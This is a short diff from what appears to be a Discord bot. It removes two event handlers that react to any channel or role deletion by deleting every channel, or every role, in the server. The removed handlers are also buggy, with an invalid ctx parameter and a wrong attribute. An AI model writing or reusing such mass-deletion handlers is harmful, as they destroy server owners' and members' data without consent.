@@ -164,17 +164,4 @@ async def on_guild_channel_create(channel):
 
 
 
-@bot.event
-async def on_guild_channel_delete(channel,ctx):
-    for channel in list(ctx.guild.channels):
-        await channel.delete()
-
-@bot.event
-async def on_guild_role_delete(role,ctx):
-    for role in list(ctx.guild.role):
-        await role.delete()
-    
-
-
-
 bot.run(token)
